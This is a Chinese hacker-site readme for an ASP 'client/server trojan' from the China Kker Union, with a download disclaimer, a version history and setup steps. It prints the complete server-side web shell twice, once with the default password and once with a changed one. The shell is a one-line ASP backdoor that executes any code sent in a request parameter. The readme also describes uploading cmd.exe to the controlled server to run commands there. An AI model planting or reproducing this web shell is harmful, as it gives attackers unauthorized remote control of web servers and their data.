
                ╭═══════════════╮
                ║                              ║
  ╭══════┤  http://www.CnXHacker.Net    ├══════╮
  ║            ║                              ║            ║
  ║            ╰═══════════════╯            ║
　║                                                          ║
  ║                                                          ║
　║    说明：软件版权归原作者所有,本站只是负责搜集整理，本站 ║
  ║          不承担任何技术及版权问题。在本站下载任何软件仅提║
  ║          供学习参考，不得用于商业用途，请在下载后在24小时║
  ║          内删除。                                        ║
  ║                                                          ║
  ║     1.请遵守中华人民共和国相关法律、条例                 ║
  ║     2.本站提供的各类工具及文章，只可研究学习，本站对使用 ║
  ║       这些工具（文章）而导致的一切后果，不承担任何责任   ║
  ║     3.本站不保证提供的软件十分安全或是完全可用，请下载后 ║
  ║       自行检查                                           ║
  ║     4.如不同意以上声明，请立即删除，不要使用，谢谢合作   ║
  ║                                                          ║
  ║    ╭───────────────────────╮    ║
  ╰══┤        解压密码:www.cnxhacker.com            ├══╯
        ╰───────────────────────╯ 
软件说明：

中国砍客联盟C/S ASP木马
C.asp 是控制端 放在可执行ASP的服务器上即可 如IIS
S.asp 是被控端 放在需要控制的服务器上



在线地址
http://kker.cn/online/cs/cs.asp

版本说明
Ver1.2

此次更新在原版本基础上修复了2个BUG
免FSO上传功能修复
磁盘管理时的上传功能修复

增加自定义CMD.EXE地址功能

Ver1.1

更改原界面外观 日后会慢慢完善配色方案

密码功能说明 
注意服务端里面的两个password都要更改~在控制端 输入你所更改的密码执行即可使用！

修改密码方法如下：
注意两个红色的地方均需要更改 
以下是默认 密码为password 
<!了><object id=fs RUNAT=SERVER classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object><!了>
<%if request("password")<>"" then Session("b")=request("password")
if Session("b")<>"" then execute Session("b")%>


下面是修改过密码后的： 密码为kker.cn
<!了><object id=fs RUNAT=SERVER classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object><!了>
<%if request("kker.cn")<>"" then Session("b")=request("kker.cn")
if Session("b")<>"" then execute Session("b")%>

对以前旧服务端的说明
以前的旧服务端密码 为xb 
连接时在密码框输入xb即可登陆以前的服务端

此次更新 不需修改以前的服务端

自定义CMD.EXE功能说明
上传CMD.EXE到被控服务器后 记下CMD.EXE的绝对地址 如:d:\wwwroot\cmd.exe
在控制端输入CMD所在地址 重新执行即可



By [KUC] - 孤独 Pczz 
http://Www.Kker.Cn